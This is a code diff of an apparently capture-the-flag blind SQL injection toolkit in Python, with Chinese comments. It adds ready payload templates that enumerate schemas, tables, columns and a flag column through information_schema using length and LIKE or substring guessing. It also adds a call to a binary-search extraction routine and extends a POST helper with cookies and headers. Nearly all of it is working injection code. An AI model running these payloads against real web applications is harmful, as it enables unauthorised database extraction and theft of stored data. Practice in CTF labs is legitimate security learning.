@@ -24,18 +24,21 @@ def chk(pl):
     return  len(requests.get(up).text) <745
 
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - pl例子如下- - - - - - - - - - - - - - - - - - - - - - - - - -
-# 爆库
-# pl1 = 'select length(group_concat(SCHEMA_NAME))={} from information_schema.SCHEMATA'
-# pl2 = 'select substr(group_concat(SCHEMA_NAME),{},1)="{}"  from information_schema.SCHEMATA'
+import utfc.SqliF as sf
+import utfc.StaticValue as stv
+#爆用户
+p1 = 'select length(group_concat(SCHEMA_NAME))={} from information_schema.SCHEMATA'
+p2 = 'select group_concat(SCHEMA_NAME) like "{}%"  from information_schema.SCHEMATA'
 #爆表
-# pl1 = 'select length(group_concat(table_name))={} from information_schema.tables where table_schema="1tfshow"'
-# pl2 = 'select substr(group_concat(table_name),{},1)="{}" from information_schema.tables where table_schema="1tfshow"'
+p3 = 'select length(group_concat(table_name))={} from information_schema.tables where table_schema="ctfshow_web"'
+p4 = 'select group_concat(table_name)  like "{}%"  from information_schema.tables where table_schema="ctfshow_web"'
 #爆字段
-# pl1 = 'select length(group_concat(column_name))={}  from information_schema.columns where table_name="ctfshow"'
-# pl2 = 'select substr(group_concat(column_name),{},1)="{}" from information_schema.columns where table_name="ctfshow"'
+p5 = 'select length(group_concat(column_name))={}  from information_schema.columns where table_name="flag233333"'
+p6 = 'select  group_concat(column_name) like "{}%" from information_schema.columns where table_name="flag233333"'
 #getflag
-# pl1 = 'select length(group_concat(flag43s))={}  from ctfshow.flagugs'
-# pl2 = 'select substr(group_concat(flag43s),{},1)="{}" from ctfshow.flagugs'
+p7 = 'select length(group_concat(flagass233))={}  from flag233333'
+p8 = 'select group_concat(flagass233) like "{}%" from flag233333'
+sf.BoolBi_like(chk,p7,p8,stv.AlphabetLike)
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 '''
 def BoolBi(chk,pl1="",pl2="",abl=Alphabet):
@@ -186,10 +189,19 @@ def bi(pl='group_concat(table_name)',plf=' from information_schema.tables where 
 
 '''
 带回显的盲注
+pl1="select group_concat(SCHEMA_NAME)from information_schema.SCHEMATA"
+pl2="select group_concat(table_name)from information_schema.tables where table_schema='ctfshow' "
+pl3="select group_concat(column_name)from information_schema.columns where table_name='flag' "
+pl4="select substring(group_concat(flag4),1,30) from ctfshow.flag"
+pl5="select substring(group_concat(flag4),31,30) from ctfshow.flag"
 '''
-def err_echo_post(url,pl,r = None,rend='</br>'):
-    rt = requests.post(url,data=pl).text
+def err_echo_post(url,pl={},r = None,rend='</br>',headers=None,cookie=None):
+    rt = requests.post(url,data=pl,headers=headers,cookies=cookie).text
     if r==None :
         return rt
     else:
-        return regx.findall(rf'({r}.*?){rend}',rt)
+        rtl = regx.findall(rf'({r}.*?){rend}',rt)
+        if len(rtl)==0:
+            return rt
+        else:
+            return rtl
